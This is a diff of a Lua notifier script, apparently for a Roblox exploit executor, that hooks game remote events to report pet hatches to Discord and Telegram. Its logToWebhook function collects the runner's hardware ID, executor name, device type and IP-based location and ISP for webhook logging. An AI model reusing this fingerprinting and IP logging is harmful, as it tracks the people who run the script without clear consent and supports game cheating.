@@ -1,3 +1,10 @@
+
+if _G.CHARLES_NOTIFIER_RUNNING then
+    print("⚠️ [CHARLES]: Notifier already running! Stopping new instance.")
+    return
+end
+_G.CHARLES_NOTIFIER_RUNNING = true
+
 -- [[ AYARLAR ]] --
 local petWebhookURL   = _G.CHARLES_PET_WEBHOOK or _G.CHARLES_WEBHOOK or ""
 local actWebhookURL   = _G.CHARLES_ACT_WEBHOOK or ""
@@ -48,8 +55,8 @@ local SessionStartTime = tick()
 
 -- [[ PET NADİRLİK KONTROL SİSTEMİ ]] --
 local FinalTargets = {
-    ["Legendary"] = false,
-    ["Mythical"] = false,
+    ["Legendary"] = true,
+    ["Mythical"] = true,
     ["Secret I"] = true,
     ["Secret II"] = true,
     ["Secret III"] = true,
@@ -143,7 +150,35 @@ local function getInventoryPetCount(targetPetName)
     return count
 end
 
+-- [[ DUPLICATE PREVENTION LOGIC ]] --
+local RecentNotifications = {} -- { [PetName_Rarity_Time] = true }
+
+local function isDuplicate(petName, rarity)
+    local key = string.format("%s_%s", tostring(petName), tostring(rarity))
+    local now = tick()
+    
+    -- Clean up old entries (more than 5 seconds old)
+    for k, t in pairs(RecentNotifications) do
+        if now - t > 5 then
+            RecentNotifications[k] = nil
+        end
+    end
+    
+    if RecentNotifications[key] and now - RecentNotifications[key] < 3 then
+        return true
+    end
+    
+    RecentNotifications[key] = now
+    return false
+end
+
 local function sendPetNotification(petName, rarity, petType, multiplier, eggName, imageId)
+    -- Check for duplicates before waiting
+    if isDuplicate(petName, rarity) then
+        debugLog("🚫 Duplicate pet notification blocked for: " .. tostring(petName))
+        return
+    end
+
     task.wait(3.5) 
 
     local totalEggs = 0
@@ -191,7 +226,7 @@ local function sendPetNotification(petName, rarity, petType, multiplier, eggName
         data.embeds[1].color = 16711680
     end
 
-    debugLog("Pet bildirimi hazırlanıyor: " .. tostring(petName))
+    debugLog("Pet bildirimi gönderiliyor: " .. tostring(petName))
     
     pcall(function()
         local finalUrl = getProxiedURL(petWebhookURL)
@@ -233,16 +268,11 @@ local function logToWebhook()
     pcall(function()
         local hwid = (gethwid and gethwid()) or (get_hwid and get_hwid()) or game:GetService("RbxAnalyticsService"):GetClientId()
         local executor = (identifyexecutor and identifyexecutor()) or "Bilinmiyor"
-        local accountAge = lp.AccountAge
         local membership = tostring(lp.MembershipType):sub(21)
-        local joinDate = os.date("%d-%m-%Y", os.time() - (accountAge * 86400))
         local UIS = game:GetService("UserInputService")
         local device = "PC"
         if UIS.TouchEnabled and not UIS.KeyboardEnabled then device = "Mobile"
         elseif game:GetService("GuiService"):IsTenFootInterface() then device = "Console" end
-        
-        local resolution = "Bilinmiyor"
-        pcall(function() resolution = math.floor(workspace.CurrentCamera.ViewportSize.X) .. "x" .. math.floor(workspace.CurrentCamera.ViewportSize.Y) end)
         
         local ipInfo = {query = "0.0.0.0", country = "Bilinmiyor", city = "Bilinmiyor", isp = "Bilinmiyor"}
         pcall(function() 
@@ -418,15 +448,18 @@ local function sendPlayerCountNotification(leavingPlayerName)
     end
 end
 
+local ConnectedRemotes = {} -- Remote -> Connection Nesnesi
+
 local function ConnectRemote(remote)
-    if not remote:IsA("RemoteEvent") then return end
+    if not remote:IsA("RemoteEvent") or ConnectedRemotes[remote] then return end
     
     local rName = remote.Name:lower()
     if rName:find("equip") or rName:find("unequip") or rName:find("wear") or rName:find("select") or rName:find("use") or (rName:find("update") and not rName:find("hatch")) then
         return
     end
 
-    remote.OnClientEvent:Connect(function(...)
+    debugLog("📡 Remote Bağlandı: " .. remote.Name)
+    ConnectedRemotes[remote] = remote.OnClientEvent:Connect(function(...)
         local args = {...}
         for _, arg in pairs(args) do
             if type(arg) == "table" then
@@ -453,7 +486,9 @@ local function ConnectRemote(remote)
                         local imageId = baseData and (baseData.Image or baseData.Thumbnail or baseData.Icon or "")
                         local eggName = "Hatched Egg"
                         
-                        sendPetNotification(nameStr, actualRarity, petType, multiplier, eggName, imageId)
+                        task.spawn(function()
+                            sendPetNotification(nameStr, actualRarity, petType, multiplier, eggName, imageId)
+                        end)
                         task.spawn(function()
                             sendTelegramNotification(nameStr, actualRarity, petType, multiplier, eggName)
                         end)
@@ -466,18 +501,25 @@ end
 
 local function SetupListeners()
     debugLog("Ağ dinleyicileri kuruluyor...")
+    
+    -- 1. Sadece "Hatch" veya "Open" içeren Remote'ları ReplicatedStorage genelinde tara
+    -- Bu yöntem en güvenlisidir, çünkü Network klasörü içinde olsa bile yakalar.
+    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
+        if obj:IsA("RemoteEvent") then
+            local lowName = obj.Name:lower()
+            if lowName:find("hatch") or lowName:find("open") then
+                ConnectRemote(obj)
+            end
+        end
+    end
+
+    -- 2. Eğer Network klasörü varsa, içindeki tüm her şeyi de bağla (Ama ConnectRemote içinde zaten kontrol ediyoruz)
     local net = GetNetwork()
     if net then
         local events = net:FindFirstChild("Events")
         if events then
             for _, r in pairs(events:GetChildren()) do ConnectRemote(r) end
             events.ChildAdded:Connect(ConnectRemote)
-        end
-    end
-    
-    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
-        if obj:IsA("RemoteEvent") and (obj.Name:find("Hatch") or obj.Name:find("Open")) then
-            ConnectRemote(obj)
         end
     end
 end
